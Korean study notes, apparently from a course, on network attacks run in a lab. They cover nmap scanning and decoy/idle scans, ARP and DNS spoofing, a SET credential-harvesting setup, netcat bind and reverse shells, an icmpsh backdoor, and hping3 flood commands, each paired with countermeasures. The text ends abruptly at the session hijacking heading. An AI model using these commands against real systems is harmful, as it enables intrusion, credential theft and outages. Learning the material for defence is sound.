# Network Hacking

## 해킹의 종류
* 네트워크 해킹
    - 같은 네트워크 내에서 해킹
* 웹 해킹
* 시스템 해킹

## 해킹 순서
1. 정보 수집    (네트워크 해킹)
2. 스캔         (네트워크 해킹)
3. 목록화
4. 침투
    - 쉘 획득
5. 나쁜짓
6. 백도어
7. 흔적 삭제 (BYE)
8. 재침투

---
### 정보수집(풋르린팅)
* 필요 정보
    - __IP__, 메일 주소, 이름, 아이디, 닉네임

* Whois
    - 인터넷의 통신망에 관한 정보제공 서비스
    - 도메인 관리 기관
        + ICANN, KISA(대한민국)
* DNS
    - 도메인에 대한 IP 주소를 알려주는 서비스
    - 도메인 네임(Domain name)
        + 네트워크상에 컴퓨터를 식별하는 호스트명
```
브라우저에서 URL을 입력하였을때 특정 사이트 IP 알아오는 방법
    - 캐시
    - hosts
    - 로컬 DNS 서버(알면 알려줌)

질의하는 dns 서버 바꾸기 : server 8.8.8.8
도메인 정보 얻기 : www.naver.com
조사하고자 하는 정보 바꾸기
    - set type=ns (도메인의 dns 서버 조사)
    - set type=all (모든 정보 표시)
    - set type=레코드
        + naver.com

nslookup
set type=all
도메인 이름
```

---
## 스캔
* 서비스를 제공하는 서버의 작동 여부와 제공하고 있는 시비스를 확인하기 위한 것
* 네트워크의 기본은 질의와 응답인데 이 매커니즘에 기초
* 열려있는 포트, 제공하는 서비스, 동작중인 데몬의 버전, 운영체제의 버전, 어플리케이션의 버전, 취약점

```
scan
* arp scan
    - arp 프로토콜을 이용해서 네트워크 대역의 정보 확인
* tracert, traceroute
    - 중간 경로, 방화벽, 대상의 live 여부 등을 알 수 있음
* ping
* icmp 스캔
    - 서버의 작동여부를 알 수 있음
* tcp, udp
    - 열러있는 포트 확인 가능
```
`$ netdiscover -r 192.168.18.0/24`  
`$ nmap -sT 192.168.18.0/24`  
`$ nmap -sS 192.168.18.0/24`  
`$ nmap 192.168.18.129 -p 20-25 `  

### TCP 스캔
* 오픈 스캔
    - 정상적인 3way handshaking 방식으로 tcp 연결을 맺고 대상포트가 열려 있는지 확인
    - 세션을 성립하기때문에 대상 시스템에 로그가 남음
    - 트래픽양이 많고 보안시스템에 감지 당하기 쉽다. 
    - `nmap -sT <target IP>`
### 스텔스 스캔
* 하프 오픈 스캔
    - nmap 기본 스캔 방식
    - 정상적인 세션 연결이 되기 전 RST패킷을 보내 세션을 맺지 않는 스캔
    - 오픕 스캔에 비해 트래릭양이 적고 속도도 빠름
    - 포트 오픈 : SYN/ACK 패킷 응답
    - 포트 닫힘 : RST/ACK 패킷이 응답
    - `nmap -sS <대상ip>`

#### syn이 보안 솔류션에 의해 막혔을 때 사용 스캔
* 닫혀 있을때 RST 응답, 필터링되거나 혹은 열려 있으면 응답 없음
    - 무시하는 응답이 대다수
    - 설정에 따라 응답 방식이 달라 안 씀
* Fin 스캔
    - tcp 플래그 값에 fin 값을 설정하고 패킷을 보내는 스캔
    - `nmap -sF <target IP>`
* Xmas스캔
    - tcp 플래그 값을 모두 설정하고 패킷을 보내서 스캔
    - `nmap -sX <target IP>`
*  Null 스캔
    - tcp 플래그 값을 설정안하고 패킷을 보내서 스캔
    - `nmap -sN <target IP>`

* ack 스캔
    - 포트가 열려있고 닫혀있는거 확인하는게 아닌 필터링(방화벽) 여부를 스캔
    - ack패킷을 보내서 RST 응답 : unfiltered
    - 응답이 없거나 icmp 도달 불가 메세지 응답 : filtered
    - `nmap -sA <target IP> -p 23`

* Window 스캔
    - ack 스캔과 유사하나 특정 운영체제에서 Windows size를 확인하여 열려있는 포트의 정보까지 확인 가능
    - 특정 운영체제에만 가능하고 정확도가 좋진 않음
    - `nmap -sW <target IP>`

============================================
### UDP 스캔
* UDP를 이용한 스캔, UDP는 기본적으로 신뢰성이 떨어지므로 스캔 결과를 신뢰하기 어려움
* 포트가 열려있으면 아무 응답이 없고 닫혀있으면 icmp unreachable 퍄킷을 보냄
    - `nmap -sU <target IP>`
    - `nmap -sU 192.168.18.130 -ㅔ 137-139`

===========================================
### Decoy 스캔
* 공격자의 IP를 숨기는 기법
* 많은 출발지 IP로 본인 IP 숨김
    - `nmap -D RND:10 <target IP>`

### Idle 스캔
* 공격자의 IP를 숨기는 기법
* 좀비 시스템의 ip로 출발지를 위조하려 스캔
    - 좀비시스템 패킷의 ip 헤더 부분 identification의 증가를 확인하여 포트가 열려있는지 확인
    - identification : 패킷 확인 번호
    - 닫혀 있으면, 1증가
    - 열려 있으면, 2증가
    - `nmap -sI <좀비ip> <공격대상ip>`

=======================================
### 운영체제, 어플리케이션 정보 추측
* ttl값
* 열려있는포트
* 배너그래빙 : 열려있는 포트에 접근했을 때 출력하는 배너에서 정보수집

========================================
* nmap 옵션
    - -A : sV + O + 기타여러가지 스크립트
    - -sV : 서비스 버전 정보 확인
    - O : 운영체제 정보 확인
```
* 시간차에 의한 공격의 구분
Paranoid : 5분이나 10분 간격으로 패킷을 하나씩 보냄.
Sneaky : WAN에서는 15초 단위로, LAN에서는 5초 단위로 패킷을 보냄.
Polite : 패킷을 0.4초 단위로 보냄.
Normal : 정상적인 경우
Aggressive : 호스트에 대한 최대 타임아웃은 5분, 패킷당 1.25초까지 응답을 기다림.
Insane : 호스트에 대한 최대 타임아웃은 75초, 패킷당 0.3초까지 응답을 기다림.
    - 방화벽과 IDS의 네트워크 카드가 100Mbps 이상이 아니면 탐지하지 못함.
`nmap -T <option> <target IP>`

```

* __nse 스크립트__ : nmap에서 사용하는 스크립트
    - 포트 스캔, live 여부, 네트워크 접근을 넘어 더 많은 정보 체킹 가능

* 배너그래빙 체크 nse 스크립트
    - `wget https://raw.github.com/hdm/scan-tools/master/nse/banner-plus.nse`  
    - `nmap --script /root/banner-plus.nse -p 1-100 <centOS_IP>`

---
##  스니필(도청)
* NIC카드를 promiscous mode 사용  
`ifconfig eth0 promisc` 활성화  
`ifconfig eth0 promisc` 비활성화  

* mirror port
    - SPAN(Switch Port Analyzer)
    - 모든 패킷을 복사

* MAC flooding attack
    - `macof`
    - arp table을 과도하게 만들어 다운시킴
        + 스위치는 hub처럼 동작하게 됨
    - 요즘은 스위치가 알아서 포트를 차단함

* TAB 장비
    - 물리적으로 랜선을 연결(스니핑)

### 희생자 공격
* arp spoofing
* icmp redirect
    - type 5

#### 스니핑 대응책
    - 존재하지 않는 네트워크 주소로 네트워크 데이터를 보내서 응답이 오면 스니핑 당하는중으로 의심해볼 수 있다.
    - __암호화 통신 사용_

---
## 스푸핑
* '속이다'라는 뜻
* IP주소, MAC주소, 호스트이름 등등을 속이는 것
* 모든 속이는 공격을 총칭함

* MAC 주소 바꾸기
    - 윈도우 : mac address changer
    - 리눅스
    ```
    ifconfig eth0 down
    ifconfig eth0 hw ether 00:0C:29:2R:74:AE
    ifconfig eth0 up
    ```

### arp spoofing
* arp protocol 취약점
    - arp 응답패킷을 받을시 출발지 주소에 대한 검증없이 무조건 유동적(dynamic)으로 arp Table에 반영

```
arp spoof 

192.168.195.130

arpspoof -t 타겟ip

arpspoof -t 192.168.195.130 192.168.195.2

192.168.195.2         00-50-56-ed-bf-63     동적
192.168.195.2         00-0c-29-a2-31-85     동적
```
* `fragrouter -B1`
    - arp spoofing 할때 사용 툴

### 대응방안
* 보안솔루션을 이용한 탐지
    - 스위치,라우터 같은 경우 -> 해당 포트에 연결되어 있는 지정된 mac 주소외 다른 프레임은 버림
* ip충돌 확인 (내 ip와 맥주소를 브로드캐스트)
    - Gratuitous ARP(my ip,mac address)
* ARP Table static(정적) 설정함
    - `arp -s <ip> <mac>`   (임시)
    - `netsh interface ip show config`
        + 인터페이스 이름 확인
    - `netsh interface ipv4 add neighbors <인터페이스 이름> <IP> <MAC>`   (영구)

### DNS 스푸핑
* DNS를 속이는 것, 피싱에 이용가능
* DNS 쿼리를 중간에서 확인하여 조작된 DNS 응답을 보내 희생자의 DNS 정보를 스푸핑함

```bash
$ vim /etc/ettercap/etter.dns

*      A   칼리리눅스ip
#*.microsoft.com    A   107.170.40.56
www.microsoft.com  PTR 107.170.40.56  

$ ettercap -G
```
* SET(사회공학적기법)
```bash
$ setoolkit

https://logins.daum.net/accounts/signinform.do
```

---
### netcat을 이용한 쉘 연결
* 정방향 연결
    - 희생자 : nc -lvp 4444 -e cmd.exe  (/bin/bash)
    - 공격자 : nc win7IP 4444

* 역방향 연결(reverse connection, reverse shell)
    - 희생자 : nc 리눅스IP 4444 -e cmd.exe
    - 공격자 : nc -lvp 4444 

### 은닉 채널(Covert Channel)
* 사용하지 않는 공간에 데이터 은닉
* 1973년 램프슨(Lampson)에 의해 정의된 용어
* 표면적인 목적 외의 정보나 은닉 메시지를 전송하기 위해 기본 통신 채널에 기생하는 통신 채널


#### icmp 백도어, icmp 은닉채널, icmp 터널링
```bash
$ yum install gcc -y
$ gcc icmpsh-m.c -o icmpsh
$ sysctl -w net.ipv4.icmp_echo_ignore_all=1
$ ./icmpsh
```
* `$ sysctl -w net.ipv4.icmp_echo_ignore_all=1`  
    - 핑을 무시하는 설정

### 프록시
* 프록시 서버
    - 클라이언트가 자신을 통해서 다른 네트워크에 간접적으로 접속할 수 있게 해주는 컴퓨터나 응용프로그램을 가리킴
      
* Forward Proxy
    - CDN(속도 업), 우회 등
* Reverse Proxy
    - 감시, 스크린 등

### 터널링
* 터널링
    - 데이터 스트림을 인터넷상에서 가상의 파이프를 통해 전달시키는 기술
    - 패킷 내에 터널링할 대상을 캡슐화시켜 목적지까지 전송하는 기술
    * IPSec, SSL, OpenVPN 등
    * PPTP, L2TP

================================================
#### SSH 터널링
* Local port forwarding
* Remote port forwarding
* Dynamic port forwarding

---
## DoS, DDoS
* DoS attack : flooding attack
    - icmp flooding, UDP flooding 등

1. Land Attack
    - 패킷을 전송할 때 출발지 IP 주소와 목적지 IP 주소 값을 똑같이 만들어서 공격 대상에 보내는 것 
* 보안대책 : 최신 OS에는 효과 없음
```
hping3  192.168.18.131 -a 192.168.18.131 --icmp --flood
   -a : 출발지 IP

공격자kali : 192.168.195.129
희생자win7 : 192.168.195.130
```


2. Smurf Attack
    - 공격 대상의 네트워크에 다이렉트 브로드 캐스트를 하면서  브로드캐스트를 보낸 출발지 주소를 공격대상의 IP로 함
    - 브로드캐스트에 대한 응답이 공격대상의 IP로 쏟아지면서 공격함
* 보안대책 : 다이렉트 브로드캐스트를 off 
```
hping3  192.168.18.255 -a 192.168.18.131 --icmp --flood
```

3. Ping of Death
    1. ping을 이용하여 ICMP 패킷의 크기를 정상보다 아주 크게 만듦
    2. 크게 만들어진 패킷은 네트워크를 통해 라우팅되어 공격 네트워크에 도달하는 동안 작은 조각으로 쪼개짐
    3. 공격 대상은 조각된 패킷을 모두 처리해댜 하므로 정상적인 Ping보다 부하가 훨씬 많이 걸림
* 보안대책 : 반복적으로 들어오는 일정수이상의 icmp 패킷을 무시
```
hping3  <Target IP> -d 65000 --icmp --rand-source
    -d 페이로드(데이터) 크기
hping3  192.168.18.131 -d 65000 --icmp --rand-source
```

4. SYN Flooding Attack
* 서버별로 한정되어 있는 접속 가능 공간에 존재하지 않는 클라이언트가 접속한 것처럼 속여 다른 사용자가 서비스를 제공받지 못하게 하는 것
    1. 공격자는 많은 숫자의 SYN 패킷을 서버에 보냄
    2. 서버는 받은 SYN 패킷에 대한 SYN/ACK 패킷을 각 클라이언트로 보냄
    3. 서버는 자신이 보낸 SYN/ACK 패킷에 대한 ACK 패킷을 받지 못함
    4. 서버는 세션의 연결을 기다리게 되고 공격은 성공함.
* 보안대책
    - 시스템 패치 설치
        - ack 대기시간을 줄이는 패치
    - 침입 탐지 시스템(IDS)이나 침입 차단 시스템(IPS)을 설치, DoS 전용 솔류션 설치 권장
    - 짧은 시간 안에 똑같은 형태의 패킷을 보내는 형태의 공격을 인지했을 경우, 그에 해당하는 IP 주소 대역의 접속을 금지하거나 방화벽 또는 라우터에서 해당 접속을 금지시킴
    - 서버에서 클라이언트로 보내는 SYN+ACK 패킷에 암호화 기술을 이용해서 인증 정보가 담긴 시퀀스 넘버를 생성하여 클라이언트에 보내는 Syn_Cookie 이용
        + cat /proc/sys/net/ipv4/tcp_syncookies # 1이면 syn쿠기 사용
    - 백로그큐 크기 키우기
        + `cat /proc/sys/net/ipv4/tcp_max_syn_backlog`
```
netstat -an |grep :23
hping3  192.168.18.129 -p 23 -S --flood
```

5. TCP Connect flooding
    - SYN Flooding Attack이 유효하지 않을시 정상적으로 많은 접속을 맺어 연결접속수를 초과하여 다른 연결들은 접속을 맺지 못하도록 하는 공격
* 보안대책
    - 같은 IP의 연결을 일정수까지만 허용함
```
while (:); do nc <공격대상ip> 80 & sleep 1;done
```

6. Bonk, Boink, Teardrop
    - 패킷의 시퀀스 넘버를 변형함
* 보안대책
    - 일정수 들어오는 패킥을 무시
    - 현재 OS는 어느 정도 조치가 되어있음

---
## 7계층 공격
* 정상 IP를 이용함
* 소량의 트래픽을 이용 가능
* 특정 서비스의 취약점을 이용하여 공격

1. HTTP GET Flooding Attack
    - GET Method를 통해 특정 페이지를 무한대로 실행
2. HTTP CC 공격
    - 캐시 사용 안함으로 하고 요청
3. 동적 HTTP Request Flooding 공격
    - URL을 조금씩 변경해 요청

4. Slow HTTP Header DoS(Slowloris) 공격
    - 헤더의 마지막을 알리는 Empty Line을 보내지 않아 웹서버를 대기시키는 공격
5. Slow HTTP POST DoS(RUDY) 공격
    - POST방식으로 데이터를 전송한면서 Content-Length 헤더필드의 값을 비정상적으로 크게 설정한 후 소량의 데이터를 지속적으로 천천히 보내는 공격
* 저대역폭 공격 대응 방법(보안대책)
    - 동일한 IP에서 연결하는 임계치를 제한
    - 타임아웃 시간 설정
    - 최신 버전의 웹 서버를 사용

6. Mail Bomb
    - 대량의 첨부파일을 보냄

---
## DDoS(Distributed Denial of Service)
* 대량의 좀비시스템을 이용하여 시스템 거부공격을 수행
    - 기존의 dos공격을 섞어 공격
    - 대용량의 대역폭으로 공격
    - 자동화 툴을 많이 씀
* master, C&C(Command&Control)
* zombie, agent

---
## DrDos
* 출발지 IP를 공격대상의 IP로 위조한 후 다수의 반사서버에 요청하면 공격대상은 반사서버로부터 다향의 응답을 받아 서비스 거부 공격이 됨

---
## 세션 하이재킹, MITM
* 